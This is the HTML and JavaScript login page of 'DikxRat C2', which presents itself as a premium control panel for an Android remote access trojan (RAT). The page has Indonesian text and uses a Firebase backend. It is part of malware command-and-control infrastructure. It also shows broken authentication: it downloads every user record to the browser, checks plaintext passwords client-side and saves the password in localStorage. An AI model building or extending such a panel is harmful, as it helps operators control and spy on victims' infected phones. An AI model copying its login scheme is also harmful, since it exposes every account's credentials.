<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>DikxRat C2 - Login</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000000;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 50%, rgba(255, 51, 51, 0.08), transparent 70%);
            pointer-events: none;
        }
        .login-container { width: 100%; max-width: 380px; position: relative; z-index: 2; }
        .login-card {
            background: rgba(10, 10, 10, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 40px 28px;
            border: 1px solid rgba(255, 51, 51, 0.5);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 25px rgba(255, 51, 51, 0.15);
        }
        .logo-area { text-align: center; margin-bottom: 32px; }
        .logo-image {
            width: 95px; height: 95px; border-radius: 50%;
            background: rgba(255, 51, 51, 0.15);
            padding: 6px; margin: 0 auto 16px;
            border: 1px solid rgba(255, 51, 51, 0.6);
            box-shadow: 0 0 20px rgba(255, 51, 51, 0.2);
        }
        .logo-image img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .logo-area h1 {
            font-size: 28px;
            background: linear-gradient(135deg, #FF3333, #FF6666);
            -webkit-background-clip: text; background-clip: text; color: transparent;
        }
        .logo-area p { color: #884444; font-size: 11px; margin-top: 6px; }
        .input-group { margin-bottom: 20px; }
        .input-group label {
            display: block; color: #FF3333; font-size: 10px;
            font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px;
        }
        .input-group input {
            width: 100%; padding: 14px 16px;
            background: rgba(20, 20, 20, 0.8);
            border: 1px solid rgba(255, 51, 51, 0.4);
            border-radius: 30px; color: #fff; font-size: 14px;
            transition: all 0.3s;
        }
        .input-group input:focus {
            outline: none; border-color: #FF3333; box-shadow: 0 0 12px rgba(255, 51, 51, 0.3);
        }
        .login-btn {
            width: 100%; padding: 14px;
            background: linear-gradient(135deg, #FF3333, #CC0000);
            border: none; border-radius: 30px;
            color: #fff; font-weight: 800; font-size: 15px;
            cursor: pointer; transition: all 0.3s; margin-top: 8px;
        }
        .login-btn:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 5px 20px rgba(255, 51, 51, 0.4); }
        .error-msg {
            background: rgba(255, 51, 51, 0.15);
            border: 1px solid rgba(255, 51, 51, 0.4);
            border-radius: 30px; padding: 12px; font-size: 12px;
            color: #FF6666; text-align: center; margin-top: 16px; display: none;
        }
        .footer { text-align: center; margin-top: 24px; color: #663333; font-size: 10px; }
        .loading { display: none; text-align: center; margin-top: 16px; }
        .loading-spinner {
            width: 30px; height: 30px;
            border: 2px solid rgba(255, 51, 51, 0.2);
            border-top-color: #FF3333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="logo-area">
                <div class="logo-image">
                    <img src="https://files.catbox.moe/dugihj.png" alt="DikxRat Logo">
                </div>
                <h1>DIKXRAT C2</h1>
                <p>Premium Android RAT Control Panel</p>
            </div>

            <div class="input-group">
                <label>📧 EMAIL</label>
                <input type="email" id="loginEmail" placeholder="contoh@gmail.com" autocomplete="off">
            </div>

            <div class="input-group">
                <label>🔑 PASSWORD</label>
                <input type="password" id="loginPassword" placeholder="Password">
            </div>

            <button class="login-btn" onclick="login()">⚡ ACCESS PANEL ⚡</button>

            <div id="errorMsg" class="error-msg"></div>
            <div id="loading" class="loading"><div class="loading-spinner"></div></div>

            <div class="footer">© 2026 DikxRat | by KingJack</div>
        </div>
    </div>

    <script>
        // 🔥 GANTI DENGAN KONFIGURASI FIREBASE ASLI LO 🔥
        const firebaseConfig = {
            apiKey: "AIzaSyD-XXXXXXXXXXXXXXXXXXXXXXXXX",
            authDomain: "dikxrat.firebaseapp.com",
            databaseURL: "https://dikxrat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "dikxrat",
            storageBucket: "dikxrat.appspot.com",
            appId: "1:613800760096:android:4b52f441eda4d620"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function login() {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPassword').value.trim();

            if (!email || !password) {
                showError('Isi email dan password!');
                return;
            }

            if (!email.includes('@gmail.com')) {
                showError('Email harus menggunakan @gmail.com!');
                return;
            }

            document.getElementById('loading').style.display = 'block';
            document.getElementById('errorMsg').style.display = 'none';

            const usersSnapshot = await db.ref('users').once('value');
            const users = usersSnapshot.val() || {};
            
            let foundUser = null;
            let foundUserId = null;
            let foundAccountId = null;

            for (const [userId, userData] of Object.entries(users)) {
                if (userData.accounts) {
                    for (const [accId, acc] of Object.entries(userData.accounts)) {
                        if (acc.email === email && acc.password === password && acc.isActive) {
                            foundUser = acc;
                            foundUserId = userId;
                            foundAccountId = accId;
                            break;
                        }
                    }
                }
                if (foundUser) break;
            }

            if (!foundUser) {
                document.getElementById('loading').style.display = 'none';
                showError('Email atau password salah!');
                return;
            }

            localStorage.setItem('currentUser', JSON.stringify({
                id: foundUser.id,
                email: foundUser.email,
                password: foundUser.password,
                role: foundUser.role,
                userId: foundUserId,
                accountId: foundAccountId,
                username: foundUser.username || email.split('@')[0],
                createdAt: foundUser.activated_at || new Date().toISOString()
            }));

            window.location.href = 'video-intro.html';
        }

        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
        }
    </script>
</body>
              </html>
